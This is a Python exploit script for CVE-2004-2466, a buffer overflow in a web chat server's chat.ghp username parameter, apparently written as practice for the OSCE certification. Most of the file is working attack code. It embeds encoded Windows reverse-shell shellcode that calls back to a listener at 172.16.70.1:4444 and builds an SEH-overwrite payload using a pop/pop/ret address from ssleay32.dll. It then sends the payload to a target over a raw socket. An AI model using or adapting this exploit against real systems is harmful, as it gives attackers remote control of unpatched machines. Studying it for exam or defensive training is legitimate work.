#!/usr/bin/python
#
# Exploit for CVE-2004-2466
#
# meik
# November 2015
# Training for CTP/OSCE exam
#

import socket
import os
import sys

# generate your own shellcode with msfvenom
# windows/shell_reverse_tcp + shikata_ga_nai (351b)
# ./msfvenom -p windows/shell_reverse_tcp LHOST=172.16.70.1 LPORT=4444 
#	-e x86/shikata_ga_nai -b "\x00\x0a\x0b\x0d\x0f\x20\x25\x26" -f c
reverse = ("\xd9\xca\xd9\x74\x24\xf4\x5a\xbd\xac\xbf\x86\xa7\x2b\xc9\xb1"
"\x52\x31\x6a\x17\x83\xea\xfc\x03\xc6\xac\x64\x52\xea\x3b\xea"
"\x9d\x12\xbc\x8b\x14\xf7\x8d\x8b\x43\x7c\xbd\x3b\x07\xd0\x32"
"\xb7\x45\xc0\xc1\xb5\x41\xe7\x62\x73\xb4\xc6\x73\x28\x84\x49"
"\xf0\x33\xd9\xa9\xc9\xfb\x2c\xa8\x0e\xe1\xdd\xf8\xc7\x6d\x73"
"\xec\x6c\x3b\x48\x87\x3f\xad\xc8\x74\xf7\xcc\xf9\x2b\x83\x96"
"\xd9\xca\x40\xa3\x53\xd4\x85\x8e\x2a\x6f\x7d\x64\xad\xb9\x4f"
"\x85\x02\x84\x7f\x74\x5a\xc1\xb8\x67\x29\x3b\xbb\x1a\x2a\xf8"
"\xc1\xc0\xbf\x1a\x61\x82\x18\xc6\x93\x47\xfe\x8d\x98\x2c\x74"
"\xc9\xbc\xb3\x59\x62\xb8\x38\x5c\xa4\x48\x7a\x7b\x60\x10\xd8"
"\xe2\x31\xfc\x8f\x1b\x21\x5f\x6f\xbe\x2a\x72\x64\xb3\x71\x1b"
"\x49\xfe\x89\xdb\xc5\x89\xfa\xe9\x4a\x22\x94\x41\x02\xec\x63"
"\xa5\x39\x48\xfb\x58\xc2\xa9\xd2\x9e\x96\xf9\x4c\x36\x97\x91"
"\x8c\xb7\x42\x35\xdc\x17\x3d\xf6\x8c\xd7\xed\x9e\xc6\xd7\xd2"
"\xbf\xe9\x3d\x7b\x55\x10\xd6\x28\xba\x5c\x27\x59\xb9\x60\x36"
"\xc5\x34\x86\x52\xe5\x10\x11\xcb\x9c\x38\xe9\x6a\x60\x97\x94"
"\xad\xea\x14\x69\x63\x1b\x50\x79\x14\xeb\x2f\x23\xb3\xf4\x85"
"\x4b\x5f\x66\x42\x8b\x16\x9b\xdd\xdc\x7f\x6d\x14\x88\x6d\xd4"
"\x8e\xae\x6f\x80\xe9\x6a\xb4\x71\xf7\x73\x39\xcd\xd3\x63\x87"
"\xce\x5f\xd7\x57\x99\x09\x81\x11\x73\xf8\x7b\xc8\x28\x52\xeb"
"\x8d\x02\x65\x6d\x92\x4e\x13\x91\x23\x27\x62\xae\x8c\xaf\x62"
"\xd7\xf0\x4f\x8c\x02\xb1\x60\xc7\x0e\x90\xe8\x8e\xdb\xa0\x74"
"\x31\x36\xe6\x80\xb2\xb2\x97\x76\xaa\xb7\x92\x33\x6c\x24\xef"
"\x2c\x19\x4a\x5c\x4c\x08")

# pop / pop / ret found in ssleay32.dll
# - 1001B2E1   5F               POP EDI
# - \xeb\x06 => jmp short 6 bytes (skips 2 \x90 and 4 byte "pop pop ret" address)
# - a bunch of nops for teh fnu
# - the reverse shell shellcode
crash = "A" * 217 + "\xeb\x06\x90\x90" + "\xe1\xb2\x01\x10" + "\x90" * 15 + reverse + "\x90" * (5000 - 4 - 4 - 217 - 15 - len(reverse))

buffer = ("GET /chat.ghp?username=" + crash + "&password=&room=1&sex=1 HTTP/1.1\r\n"
"User-Agent: Mozilla/4.0\r\n"
"Host: 172.16.70.128:80\r\n"
"Accept-Language: en-us\r\n"
"Accept-Encoding: gzip, deflate\r\n"
"Referer: http://172.16.70.128\r\n"
"Connection: Keep-Alive\r\n\r\n")

print "[*] Exploiting, make sure there is a netcat listener !"

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("172.16.70.128", 80))
expl.send(buffer)
expl.close()
